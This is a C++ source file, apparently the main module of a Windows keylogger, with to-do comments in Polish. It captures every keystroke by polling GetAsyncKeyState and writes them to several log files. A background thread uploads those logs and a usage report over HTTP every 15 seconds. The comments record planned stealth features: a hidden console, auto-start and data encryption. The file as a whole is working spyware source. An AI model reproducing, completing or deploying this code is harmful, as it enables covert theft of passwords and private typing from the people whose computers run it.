#include <Windows.h>
#include <fstream>
#include <curl/curl.h>
#include <thread>
#include <chrono>
#include <map>

#include "KeyRepresentation.h"
#include "FilesSaver.h"
#include "NormalSaver.h"
#include "TimeLogFileSaver.h"
#include "WordNormalFileSaver.h"
#include "RaportMaker.h"
#include "HttpSender.h"

std::map<std::string, int> KeyInfo_Map_press;

void TaskQueue(const std::string& normalFile, const std::string& timeLogFile,
    const std::string& wordLogFile, const std::string& reportFile, RaportMaker& raportMaker) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(15));

        raportMaker.SaveReport(KeyInfo_Map_press);

        SendFileHttp(normalFile);
        SendFileHttp(timeLogFile);
        SendFileHttp(wordLogFile);
        SendFileHttp(reportFile);
    }
}


int main() {

    // FileSaver* prt_NormalFile = new NormalSaver("wynik_normal.txt");
    // FileSaver* prt_LogiFile = new TimeLogFileSaver("logi_time.txt");
    // FileSaver* prt_LetterFile = new WordNormalFileSaver("znaki_normal.txt");


    FileSaver* fileSaver;

    RaportMaker raportMaker("raport.txt");

    std::thread TaskQueue_File(TaskQueue,
                               std::string("wynik_normal.txt"),
                               std::string("logi_time.txt"),
                               std::string("znaki_normal.txt"),
                               std::string("raport.txt"),
                               std::ref(raportMaker));

     while (true) {

         std::this_thread::sleep_for(std::chrono::milliseconds(10));

        for (int i = 0; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                std::string key_representation = GetKeyRepresentation(i);

                KeyInfo_Map_press[key_representation]++;

                // prt_NormalFile->SaveNormal(i);
                // prt_LogiFile->SaveNormal(i);
                // prt_LetterFile->SaveNormal(i);

                fileSaver = new NormalSaver("wynik_normal.txt");//shhdh
                fileSaver->SaveNormal(i);


                fileSaver = new TimeLogFileSaver("logi_time.txt");
                fileSaver->SaveNormal(i);

                delete fileSaver;
                fileSaver = new WordNormalFileSaver("znaki_normal.txt");
                fileSaver->SaveNormal(i);
            }
        }
    }

    TaskQueue_File.join();
    // delete prt_NormalFile;
    // delete prt_LogiFile;
    // delete prt_LetterFile;
    return 0;
}
















//to do
//kodowanie pliku z kluczem
//Szyfrowanie danych

//klasa do zbierania bledow gdyby takie wystapily
//nowe ciekawe rzeczy w raporcie



//done
//niech bedzie wiedziec ktore znaki sa z duzej ktore z malej
//plik gdzie beda same slowa bez znakow []
//wysylanie na serwer http co 10 min
//niech pliki beda miec nazwe nazwa_godzina
//generowanie raportu 12.0 - boze ile wersji
//dodanie do raportu informacji o aktualnie uruchomionych procesach
//dziedziczenie z normalfile na 2 inne pliki
//dziedziczenie running procesow z system info


//niewykonalne
//Kompresja plików - dodatkowa biblioteka
//nie pojawia sie konsola - robi sie to w plikach cmakelist
// Dodanie opcji auto-uruchamiania - nie mam psychy by to zrobic
//notacja polska - nie jest mozliwe